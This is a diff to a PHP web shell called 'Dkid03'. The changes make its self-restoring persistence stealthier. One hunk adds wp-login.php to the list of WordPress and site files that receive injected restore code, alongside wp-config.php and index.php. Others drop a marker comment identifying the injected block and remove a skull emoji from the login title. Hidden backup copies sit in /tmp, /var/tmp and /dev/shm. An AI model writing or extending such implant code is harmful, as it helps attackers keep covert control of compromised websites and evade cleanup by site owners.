@@ -13,7 +13,6 @@ function auto_restore_by_name() {
         '/tmp/' . md5($CURRENT_SHELL) . '.inc',
         '/var/tmp/' . md5($CURRENT_SHELL) . '.inc',
         '/dev/shm/' . md5($CURRENT_SHELL) . '.inc',
-        __DIR__ . '/.cache/' . $CURRENT_SHELL . '.inc'
     ];
     
     if (!file_exists(__DIR__ . '/' . $CURRENT_SHELL)) {
@@ -1715,6 +1714,7 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
     
     $targetFiles = [
         __DIR__ . '/index.php',
+        __DIR__ . '/wp-login.php',
         __DIR__ . '/wp-config.php',
         __DIR__ . '/config.php',
         __DIR__ . '/wp-load.php',
@@ -1722,7 +1722,6 @@ if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION[
     ];
     
     $restoreCode = '
-// ===== DKD AUTO RESTORE ('. $CURRENT_SHELL .') =====
 if (!function_exists("dkd_restore_' . md5($CURRENT_SHELL) . '")) {
     function dkd_restore_' . md5($CURRENT_SHELL) . '() {
         $current_file = "' . $CURRENT_SHELL . '";
@@ -2444,7 +2443,7 @@ if (isset($_SESSION['loggedin'])) {
     <?php if (!isset($_SESSION['loggedin'])): ?>
         <div class="login-container">
             <div class="login-box">
-                <h1 class="login-title">💀 Dkid03</h1>
+                <h1 class="login-title">Dkid03</h1>
                 <?php if (!empty($loginError)): ?>
                     <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
                 <?php endif; ?>
